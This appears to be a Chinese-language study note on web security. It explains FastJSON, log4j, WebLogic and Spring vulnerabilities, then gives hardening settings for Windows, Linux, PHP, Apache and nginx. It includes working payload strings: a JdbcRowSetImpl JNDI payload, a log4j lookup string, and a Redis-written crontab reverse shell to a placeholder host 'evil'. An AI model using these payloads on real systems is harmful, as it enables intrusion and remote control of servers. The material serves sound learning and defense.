**Q：常见的HTTP请求头注入有哪些？**
A：Cookie（获取该字段并验证客户端身份）、User-Agent（记录客户端版本操作系统或根据该字段推动不同的网页）、Referer（统计网站的点击量）、XFF（X-Forwarded-For记录客户端真实IP）

**Q：HTTP Keep-Alive机制？**
A：`Connection: keep-alive/close`开启/关闭保持连接（长连接）。

## FastJSON反序列化漏洞

@type允许传入任意类名，并通过反序列化函数将json反序列化为类，com.sun.rowset.JdbcRowSetImpl允许rmi和idap协议，搭建二者之一的服务器和http服务器存放编译好的Java代码，即可在攻击时执行构造的代码。

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

二代加入checkAutoType函数对传入的类名进行黑名单过滤并限制长度，可以通过非黑名单函数`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`绕过；还可以绕过loadClass函数开头`L`结尾`;`被去掉然后正常执行。

三代嵌套反序列化，先做一个不在黑名单中的，使cache为True之后在load旧类时判断条件有`TypeUtils.getClassFromMapping(typeName) ！=null`后面直接从mapping中提出类并最终返回，没有通过黑名单测试。

## log4j

resolveVariable方法中resolver.lookup调用了lookup函数导致命令执行，通过log.info的方法传递进入的payload被执行`${jndi:ldap(rmi/dns)://127.0.0.1/exp}`

## weblogic

### SSRF（CVE-2014-4210）

`http://192.168.199.155:7001/uddiexplorer/`参数oprator应该执行了ping命令，返回值显示其后的地址是否可达，构造radis命令，将弹shell指令存入corntab。

```shell
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/evil/21 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

`\r\n`是`%0d%0a`

### 远程代码执行（CVE-2023-21839）

漏洞的触发点在ForeignOpaqueReference.getReferent()

ForeignOpaqueReference继承自OpaqueReference，前面说过，当远程对象继承自OpaqueReference时，客户端在对该对象进行JNDI查找并获取的时候，服务器端实际上是通过调用远程对象的getReferent()方法来获取该对象的实际引用。所以，如果远程绑定了ForeignOpaqueReference对象，在lookup查询该对象时，就会调用ForeignOpaqueReference.getReferent()，所以这里我们只要控制var4与this.remoteJNDIName就能造成jndi注入。
var4的话，只要this.jndiEnvironment有值，就用this.jndiEnvironment的值对InitialContext进行初始化，this.jndiEnvironment也可以使用反射的方式进行赋值。

### wls-wsat XMLDecoder反序列化（CVE-2017-10271）

weblogic中的WLS组件接收到SOAP格式的请求后，未对解析xml后的类，参数等进行处理，一系列传入最后执行了`xmlDecoder.readObject`触发调用了类中的方法，产生漏洞。
跟进`readUTF`，在这里进行了`xmlDecoder.readObject`触发了`xmlDecoder`的反序列化，执行了`ProcessBuilder.start()`

## spring

### spring-data-XMLBean XXE（CVE-2018-1259）

这个XXE漏洞本质是因`DefaultXMLFactoriesConfig.java`配置不当而导致的，`Spring Data Commons`的某些版本中恰好使用了含有漏洞的`XMLBean`组件。XMLBeam不会限制XML外部实体应用，导致未经身份验证的远程恶意用户可以针对Spring Data的请求绑定特定的参数，访问系统上的任意文件。

### Spring Cloud Gateway Actuator API SpEL Code Injection （CVE-2022-22947）

1、首先，修改GET /actuator请求，确定actuator端口已经开启
2、修改get请求，获取路由信息GET /actuator/gateway/routes/:
3、构造一个post请求包，POST /actuator/gateway/routes/test 添加一个包含恶意SpEL表达式的路由
4、刷新路由，POST /actuator/gateway/refresh
5、获取路由信息GET /actuator/gateway/routes/，新增路由test成功：
6、构造get请求，查看当前路由信息，GET /actuator/gateway/routes/test,检索结果命令执行结果，当前用户为root 
7、最后，删除我们前面构造的路由，DELETE /actuator/gateway/routes/test

ConfigurationService->normalize->ShortcutConfigurable.getValue()->expression对spEL表达式进行处理

1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。

## 安全配置

==隐藏自身-隐藏指纹-选用安全版本-安全配置-权限控制-记录日志==

### windows

密码策略：密码必须符合复杂性要求、密码长度最小值、密码使用期限、强制密码历史、用可还原的加密存储密码（禁用）、最小密码长度审核
账户锁定策略：账户锁定时间、账户锁定阈值（次数）、重置账户锁定计时器
本地策略-安全选项：管理员账户状态、禁用Microsoft账户
交互式登录：不显示用户名、不活动限制、锁定会话时显示用户信息
用户账户控制：标准用户提升行为（自动拒绝）、管理员提升权限提示
高级安全审计配置：审核凭据验证（成功和失败）、审核应用程序组管理、审核安全组管理、审核用户账户管理、审核进程创建（s）、审核账户锁定（f）、审核注销（s）、审核登录（s/f）、审核其它登录/注销时间（s/f）、审核特殊登录（s）、审核详细的文件共享（f）、审核文件共享、审核其他对象访问时间、审核可移动存储、审核敏感权限使用

### linux

设置强密码策略`/etc/pam.d/system-auth`、限制用户登陆时间`/etc/profile`、关闭多余端口和服务、禁用sshroot登录、禁止登录vsftpd、限制最大传输速率、改默认端口、`iptables -A INPUT -p tcp --dport 23 -j DROP`、`iptables -A INPUT -p icmp --icmp-type echo-request -j DROP`、只允许内部ssh连接

### PHP

打开php安全模式`safe_mode=on`
用户组安全：`safe_mode_gid=off`（如果需要文件操作）
设定执行程序主目录：`safe_mode_exec_dir = /var/www/html`
安全模式包含文件：`safe_mode_include_dir = /var/www/html`
控制PHP脚本能访问的目录：`open_basedir=/var/www/html`
关闭危险函数：`disable_function=chdir, chroot, dir, getcwd, opendir, readdir, scandir, fopen, unlink, delete, copy, mkdir, rmdir, rename, file, file_get_contents, fputs, fwrite, chgrp,chmod, chow`
关闭php版本信息在http头中的泄露：`expose_php=off`
关闭注册全局变量：`register_globals=Off`
关闭错误信息：`display_errors = Off`、`error_reporting = E_WARNING & E_ERROR`
打开错误日志：`log_errors = On`

### apache

删除默认网站和页面。
配置https.conf禁止目录浏览：`Options -Indexes FollowSymLinks`
配置默认文档：`DirectoryIndex index.html`
合理配置apache运行账户：

```xml
<code>User apache
Group apache
</code>
```
合理控制apache账户对磁盘的写入和执行权限：取消写除上传目录、非网站目录不给权限
取消运行账户对sh等的执行权限
取消上传目录对php的执行权限

```
<Directory "/var/www/html/aaa">    
    <FilesMatch ".(php|php5)$">    
        Deny from all    
    </FilesMatch>
</Directory>
```

限制文件类型访问
关闭对htaccess的支持

```
<code>AllowOverride None
</code>
```

htaccess（灵活分配访问策略；目录多多难以配置、容易覆盖、易被非授权用户拿到）定制默认文档、定制错误页面、控制访问文件和目录的级别、防止列目录
```xml
<code>Options -Index
</code>
```

### nginx

隐藏不必要信息：`server_tokens off`、`proxy_hide_header <command>`（X-Powered-By）
禁用非必要方法：

```nginx
if ($request_method !~ ^(GET|HEAD|POST)$ ) {
    return 444;
}
```

配置合理的响应头：
```nginx
add_header Strict-Transport-Security "max-age=31536000";
add_header X-Frame-Options deny;
add_header X-Content-Type-Options nosniff;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://a.disquscdn.com; img-src 'self' data: https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; frame-src https://disqus.com";
```

**Strict-Transport-Security（简称为 HSTS）**可以告诉浏览器，在指定的 max-age 内，始终通过 HTTPS 访问我的博客。即使用户自己输入 HTTP 的地址，或者点击了 HTTP 链接，浏览器也会在本地替换为 HTTPS 再发送请求。另外由于我的证书不支持多域名，我没有加上 includeSubDomains。
**X-Frame-Options** 用来指定此网页是否允许被 iframe 嵌套，deny 就是不允许任何嵌套发生。
**X-Content-Type-Options** 用来指定浏览器对未指定或错误指定 Content-Type 资源真正类型的猜测行为，nosniff 表示不允许任何猜测。
**Content-Security-Policy（简称为 CSP）**用来指定页面可以加载哪些资源，主要目的是减少 XSS 的发生。我允许了来自本站、disquscdn 的外链 JS，还允许内联 JS，以及在 JS 中使用 eval；允许来自本站和 google 统计的图片，以及内联图片（Data URI 形式）；允许本站外链 CSS 以及内联 CSS；允许 iframe 加载来自 disqus 的页面。对于其他未指定的资源，都会走默认规则 self，也就是只允许加载本站的。